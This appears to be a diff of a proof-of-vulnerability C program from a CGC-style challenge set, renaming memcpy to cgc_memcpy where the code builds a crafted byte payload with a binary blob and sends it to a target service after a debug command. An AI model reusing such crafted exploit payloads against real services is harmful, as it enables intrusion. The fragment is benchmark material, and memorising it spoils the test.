@@ -45,7 +45,7 @@ int main(void) {
     payload[p_len++] = 0xA5;
     payload[p_len++] = 1;
     payload[p_len++] = 0x83;
-    memcpy(&payload[p_len], "HAX", 3);
+    cgc_memcpy(&payload[p_len], "HAX", 3);
     p_len += 3;
     payload[p_len++] = 0xA3;
     *(unsigned short *)&payload[p_len] = swap16(21866);
@@ -76,7 +76,7 @@ int main(void) {
     payload[p_len++] = 0xA3;
     *(unsigned short *)&payload[p_len] = swap16(20);
     p_len += 2;
-    memcpy(&payload[p_len], "\x13\xbem\x9b\x83s\x9d\x07\xcak\xcc\xee@k\x7f\xe1\xec\x03\xa7\x37", 20);
+    cgc_memcpy(&payload[p_len], "\x13\xbem\x9b\x83s\x9d\x07\xcak\xcc\xee@k\x7f\xe1\xec\x03\xa7\x37", 20);
     p_len += 20;
     transmit_all(STDOUT, &CMD_DEBUG, 8);
     transmit_all(STDOUT, &p_len, 4);
